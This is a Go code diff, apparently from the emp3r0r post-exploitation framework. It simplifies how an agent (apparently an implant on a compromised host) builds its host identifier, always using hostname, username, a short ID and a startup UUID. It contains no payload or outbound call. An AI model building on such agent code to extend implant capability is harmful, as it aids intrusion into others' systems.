@@ -11,7 +11,6 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/google/uuid"
 	"github.com/jaypipes/ghw"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 )
@@ -142,14 +141,7 @@ func genShortID() (id string) {
 }
 
 // GetHostID unique identifier of the host
-func GetHostID(info *ghw.ProductInfo, fallbackUUID string) (id string) {
-	// check if info is nil
-	if info == nil {
-		info = &ghw.ProductInfo{}
-		info.UUID = fallbackUUID
-		info.SerialNumber = fallbackUUID
-	}
-
+func GetHostID(productInfo *ghw.ProductInfo, fallbackUUID string) (id string) {
 	shortID := genShortID()
 	id = fmt.Sprintf("unknown_hostname_%s-agent", shortID)
 	name, err := os.Hostname()
@@ -158,22 +150,11 @@ func GetHostID(info *ghw.ProductInfo, fallbackUUID string) (id string) {
 		return
 	}
 	name = fmt.Sprintf("%s\\%s", name, GetUsername()) // hostname\\username
-	fallback := false
-	product_uuid, err := uuid.Parse(info.UUID)
-	if err != nil {
-		logging.Debugf("GetHostID: %v", err)
-		fallback = true
-	}
-	if product_uuid.ID() == 0 {
-		// ghw might return a zero UUID
-		// which we don't need
-		fallback = true
-	}
+
+	// Always use fallbackUUID (which is the AgentUUID generated at startup)
+	// along with hostname and shortID (MAC-based) to derive a deterministic AgentTag
 	id = fmt.Sprintf("%s_%s-agent-%s", name, shortID, fallbackUUID)
 
-	if !fallback {
-		id = fmt.Sprintf("%s_%s-agent-%s", name, shortID, info.UUID)
-	}
 	return
 }
 
